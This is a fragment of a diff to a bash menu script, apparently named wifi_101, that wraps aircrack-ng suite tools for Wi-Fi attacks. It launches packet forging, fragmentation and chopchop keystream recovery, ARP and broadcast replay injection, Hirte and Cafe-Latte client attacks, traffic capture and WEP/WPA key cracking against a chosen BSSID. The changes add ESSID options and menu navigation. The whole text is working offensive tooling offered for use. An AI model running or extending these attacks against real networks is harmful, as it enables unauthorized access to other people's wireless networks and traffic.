-			done;;
-
-			advanced) pforge_II--;;
+			simple) pforge_S--;;
+			advanced) pforge_A--;;
 		esac
 
 		echo -e "\033[1;33m"
 		case $p_mode in
-			simple) packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w arp-request ;;
+			simple) packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w $nowdate\arp-request ;;
 			advanced) packetforge-ng -0 -a $b -h $sm -k $dst_ip -l $src_ip -y $xor -w arp-request ;;
 		esac
 
 		case $p_mode in
 			simple|advanced) while [ -z $pf_var ];do
-					echo -e "\033[36m\nWhat was the name of the file just created?"
-					read pf_var
-				done;;
+				echo -e "\033[36m\nWhat was the name of the file just created?"
+				read pf_var
+			done
+
+			venue--;;
 
 			venue) venue--;;
 
 			main) main_menu--;;
 		esac;;
 
-		automate)
-			echo -e "\033[1;33m"
-			packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w arp-request
-			while [ -z $pf_var ];do
-				echo -e "\033[36m\nWhat was the name of the file just created?"
-				read pf_var
-			done;;
-		esac
+		automate) echo -e "\033[1;33m"
+		packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w arp-request
+		while [ -z $pf_var ];do
+			echo -e "\033[36m\nWhat was the name of the file just created?"
+			read pf_var
+		done;;
+
+	esac
 	}
 
 	forge_out--()
 	{
 	case $parent in
 		venue)
-	clear
-	echo -e "\033[1;34m
+		clear
+		echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --Forged Packet Injection Parameters--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
 1) Replayed Packets per Burst [\033[1;33m$rppb\033[36m]
 
-2) Tgt Channel                [\033[1;33m$tc\033[36m]
+2) Packetforge-NG Filename    [\033[1;33m$pf_var\033[36m]
 
 3) Source MAC                 [\033[1;33m$sm\033[36m]
 
-4) Proceed\033[1;34m
+4) Proceed
+
+P)revious Menu
+
+M)ain Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
-	xterm -bg black -fg grey -sb -rightbar -title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
-	venue--;;
+		read var
+		case $var in
+			1) echo -e "\033[36m\nReplayed Packets per Burst?"
+			read rppb
+			if [ $rppb -gt 1000 ];then
+				rppb=1000
+			elif [ $rppb -lt 1 ];then
+				rppb=1
+			fi
+			forge_out--;;
+
+			2) echo -e "\033[36m\nPacketforce-NG Filename?"
+			read pf_var
+			forge_out--;;
+
+			3) echo -e "\033[36mSource MAC?"
+			read sm
+			forge_out--;;
+
+			4) if [[ -z $rppb || -z $pf_var || -z $sm ]];then
+				echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
+				sleep 1
+				forge_out--
+			fi;;
+
+			p|P) venue--;;
+
+			m|M) main_menu--;;
+
+			*) forge_out--;;
+		esac
+
 	
-	automate) xterm -bg black -fg grey -sb -rightbar -title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
-	venue--;;
+		xterm -bg black -fg grey -sb -rightbar -title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
+		venue--;;
+	
+		automate) xterm -bg black -fg grey -sb -rightbar -title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
+		venue--;;
 
 	esac
 	}
@@ -2722,11 +2628,24 @@ Client Technique Selection
 
 3) Cafe-Latte
 
-4) Shared-Key PRGA Capture\033[1;34m
+4) Shared-Key PRGA Capture
+
+P)revious Menu
+
+M)ain Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read ct
 	case $ct in
 		1|2|3|4) ctech_II--;;
+
+		p|P) case $parent in
+			venue) venue--;;
+
+			automate) automate--;;
+		esac;;
+
+		m|M) main_menu--;;
+
 		*) ctech--;;
 	esac
 	}
@@ -2772,14 +2691,14 @@ M)ain Menu\033[1;34m
 			*) crack--;;
 		esac
 
-		xterm -bg black -fg grey -sb -rightbar -hold -title "WEP Crackin BSSID:$b File:$cf" -e aircrack-ng -a 1 -b $b $cf & ;;
+		xterm -bg black -fg grey -sb -rightbar -hold -title "WEP Crackin BSSID: $b File: $cf" -e aircrack-ng -a 1 -b $b $cf* &
+		crack--;;
 
-		automate) xterm -bg black -fg grey -sb -rightbar -hold -title "WEP Crackin BSSID:$b File:$cf" -e aircrack-ng -a 1 -b $b $cf-*.cap &
-	esac
-
+		automate) xterm -bg black -fg grey -sb -rightbar -hold -title "WEP Crackin BSSID: $b File: $cf" -e aircrack-ng -a 1 -b $b $cf-*.cap &
 		echo -e "\033[1;33mYour .cap file starts with ~~~> $cf\n\n\033[1;32mPress Enter to Return"
 		read
 		venue--
+	esac
 	}
 
 	WPA--()
@@ -2810,13 +2729,19 @@ M)ain Menu\033[1;34m
 
 8) d'Otreppe WPA2 (Specified ESSID)
 
-9) d'Otreppe All Tags (Specified ESSID)\033[1;34m
+9) d'Otreppe All Tags (Specified ESSID)
+
+P)revious Menu
+
+M)ain Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read wifu
 	case $wifu in
 		1|4|7) enc_type='-z 2';;
 		2|5|8) enc_type='-Z 4';;
 		3|6|9) enc_type='-0';;
+		p|P) venue--;;
+		m|M) main_menu--;;
 		*) WPA--;;
 	esac
 
@@ -2850,7 +2775,7 @@ M)ain Menu\033[1;34m
 
 P)revious Menu
 
-M)ain Menu
+M)ain Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
@@ -2891,38 +2816,35 @@ M)ain Menu
 	}
 ##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- venue-- functions ~~~~~~~~~~~~~~~~~~~~~~~##
 
-##~~~~~~~~~~ BEGIN wifi_101-- rtech-- & ctech-- shared sub-functions ~~~~~~~~~~##
-	
-##~~~~~~~~~~~ END wifi_101-- rtech-- & ctech-- shared sub-functions ~~~~~~~~~~~##
-
 ##~~~~~~~~~~~~~~~ BEGIN wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
 	rtech_II--()
 	{
 	clear
 	case $parent in
-		venue) 
-		case $parent_II in
+		venue) case $parent_II in
 			fragchop) echo -e "\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-  --Attack Generation Parameters--
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-1) Tgt Channel [\033[1;33m$tc\033[36m]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      --Attack Generation Parameters--
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
+1) Tgt Channel      [\033[1;33m$tc\033[36m]
 
-2) Source MAC  [\033[1;33m$sm\033[36m]
+2) Source MAC       [\033[1;33m$sm\033[36m]
 
-3) Tgt BSSID   [\033[1;33m$b\033[36m]
+3) Tgt BSSID        [\033[1;33m$b\033[36m]
 
-4) Proceed
+4) ESSID {Optional} [\033[1;33m$e\033[36m]
+
+5) Proceed
 
 P)revious Menu
 
 M)ain Menu\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 			read var
 			case $var in
 				1) parent_III="rtech" 
 				tchan--
-				iwconfig $pii channel $tc;;
+				iwconfig $pii channel $tc ;;
 
 				2) echo -e "\033[36mSource MAC?"
 				read sm
@@ -2932,7 +2854,11 @@ M)ain Menu\033[1;34m
 				read b
 				rtech_II--;;
 
-				4) if [[ -z $tc || -z $sm || -z $b ]];then
+				4) echo -e "\033[36m\nTgt ESSID? (Leave Blank to Null)"
+				read e
+				rtech_II--;;
+
+				5) if [[ -z $tc || -z $sm || -z $b ]];then
 					echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
 					sleep 1
 					rtech_II--
@@ -2947,7 +2873,7 @@ M)ain Menu\033[1;34m
 
 			broadarp) echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                          --Attack Generation Parameters--
+                     --Attack Generation Parameters--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
 1) Replayed Packets per Burst {500 is Recommended} [\033[1;33m$rppb\033[36m]
 
@@ -2957,7 +2883,9 @@ M)ain Menu\033[1;34m
 
 4) Tgt BSSID                                       [\033[1;33m$b\033[36m]
 
-5) Proceed
+5) ESSID {Optional}                                [\033[1;33m$e\033[36m]
+
+6) Proceed
 
 P)revious Menu
 
@@ -2986,7 +2914,11 @@ M)ain Menu\033[1;34m
 				read b
 				rtech_II--;;
 
-				5) if [[ -z $rppb || -z $tc || -z $sm || -z $b ]];then
+				5) echo -e "\033[36m\nTgt ESSID? (Leave Blank to Null)"
+				read e
+				rtech_II--;;
+
+				6) if [[ -z $rppb || -z $tc || -z $sm || -z $b ]];then
 					echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
 					sleep 1
 					rtech_II--
@@ -3018,7 +2950,9 @@ M)ain Menu\033[1;34m
 
 6) Tgt BSSID                                              [\033[1;33m$b\033[36m]
 
-7) Proceed\033[1;34m
+7) ESSID {Optional}                                       [\033[1;33m$e\033[36m]
+
+8) Proceed\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 		read var
 		case $var in
@@ -3059,7 +2993,11 @@ M)ain Menu\033[1;34m
 			read b
 			rtech_II--;;
 
-			7) if [[ -z $ppb || -z $rd || -z $kaf || -z $rppb || -z $sm || -z $b ]];then
+			7) echo -e "\033[36m\nTgt ESSID? (Leave Blank to Null)"
+			read e
+			rtech_II--;;
+
+			8) if [[ -z $ppb || -z $rd || -z $kaf || -z $rppb || -z $sm || -z $b ]];then
 				echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
 				sleep 1
 				rtech_II--
@@ -3141,16 +3079,28 @@ M)ain Menu\033[1;34m
 ## Frag sub-functions
 	frag_gen--()
 	{
-	echo -e "\033[1;33m"
-	aireplay-ng -5 -b $b -h $sm $pii
+	case $parent in
+		venue) if [[ -z $e ]];then
+			xterm -bg black -fg grey -sb -rightbar -hold -title "Fragmentation Attack BSSID: $b" -e aireplay-ng -5 -b $b -h $sm $pii &
+		else
+			xterm -bg black -fg grey -sb -rightbar -hold -title "Fragmentation Attack ESSID: $e" -e aireplay-ng -5 -b $b -e "$e" -h $sm $pii &
+		fi;;
+
+		automate) echo -e "\033[1;33m"
+		if [ -z $e ];then
+			aireplay-ng -5 -b $b -h $sm $pii
+		else
+			aireplay-ng -5 -b $b -e "$e" -h $sm $pii
+		fi;;
+	esac
+
+	## The below comments go for chop_gen--() as well.
     ## The next line of script refers to the readout you get from the command above.
     ## It will look like this:
     ## Saving keystream in <filename>
     ## I haven't yet figured out how to "Grep Out" the output to fork it into the next command so that the .xor is used automatically with the packetforge-ng technique, if you know of a way, please email.
     ## use stdin for forking via $$?, when I get a router to play with, I SHALL implement this.. dd style perhaps?
 	case $parent in
-		venue) read ;;
-
 		automate) xor= ## .xor file
 		while [ -z $xor ];do
 			echo -e "\033[36m
@@ -3166,12 +3116,22 @@ M)ain Menu\033[1;34m
 ## Chop sub-functions
 	chop_gen--()
 	{
-	xor= ## Nulled
-	echo -e "\033[1;33m"
-	aireplay-ng -4 -b $b -h $sm $pii
 	case $parent in
-		venue) read ;;
+		venue) if [[ -z $e ]];then
+			xterm -bg black -fg grey -sb -rightbar -hold -title "ChopChop Attack BSSID: $b" -e aireplay-ng -4 -b $b -h $sm $pii &
+		else
+			xterm -bg black -fg grey -sb -rightbar -hold -title "ChopChop Attack ESSID: $e" -e aireplay-ng -4 -b $b -e "$e" -h $sm $pii &
+		fi;;
 
+		automate) echo -e "\033[1;33m"
+		if [ -z $e ];then
+			aireplay-ng -4 -b $b -h $sm $pii
+		else
+			aireplay-ng -4 -b $b -e "$e" -h $sm $pii
+		fi;;
+	esac
+
+	case $parent in
 		automate) xor= ## .xor file
 		while [ -z $xor ];do
 			echo -e "\033[36m
@@ -3184,16 +3144,13 @@ M)ain Menu\033[1;34m
 	esac
 	}
 
-## Chop & Forge shared functions
-
-
 ## ARP sub-function
 	arp_out--()
 	{ xterm -bg black -fg grey -sb -rightbar -title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }
 
 ## Broadcast Attack sub-function
 	broad_out--()
-	{ xterm -bg black -fg grey -sb -rightbar -title "-2 Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }
+	{ xterm -bg black -fg grey -sb -rightbar -title "Broadcast Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }
 
 ##~~~~~~~~~~~~~~~~ END wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -3255,7 +3212,7 @@ M)ain Menu\033[1;34m
 		2) xterm -bg black -fg grey -sb -rightbar -title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
 		sleep 2;;
 
-		3) xterm -bg black -fg grey -sb -rightbar -title Cafe-Latte -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
+		3) xterm -bg black -fg grey -sb -rightbar -title "Cafe-Latte" -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
 		sleep 2;;
 
 		4) parent_VI="ctech"
@@ -3264,7 +3221,7 @@ M)ain Menu\033[1;34m
 
 ## Yes, this is lazy, it will be recoded later...
 	case $ct in
-		1|2|3) xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel:$tc File:$cf BSSID:$b Format:pcap" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format pcap &
+		1|2|3) xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf BSSID: $b Format:pcap" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format pcap &
 	esac
 
 	st_3--
@@ -3298,20 +3255,7 @@ M)ain Menu\033[1;34m
 
 	cleanup_101--()
 	{
-	echo -e "\033[36m\nKill WiFi_101 Processess Before Returning to Main Menu? (y or n)"
-	read kill_wifi
-	case $kill_wifi in
-		y|Y) echo -e "\033[1;33m"
-		killall xterm
-		killall airbase-ng
-		killall aircrack-ng
-		killall aireplay-ng
-		main_menu--;;
-
-		n|N) main_menu--;;
-
-		*) cleanup_101--;;
-	esac
+	main_menu--
 	}
 
 ## wifi_101-- Launcher
@@ -3332,7 +3276,7 @@ if [ -z $1  ]; then
 	kill_mon= ## Variable to determine if the "killing a monitor mode option" has been selected
 	mon_live= ## Nulled
 	dev_check= ## Nulled
-	current_ver=0.9
+	current_ver=1.3
 	trap_check= ## Variable for exiting out of the Parent script if the update feature is launched
 	greet--
 else
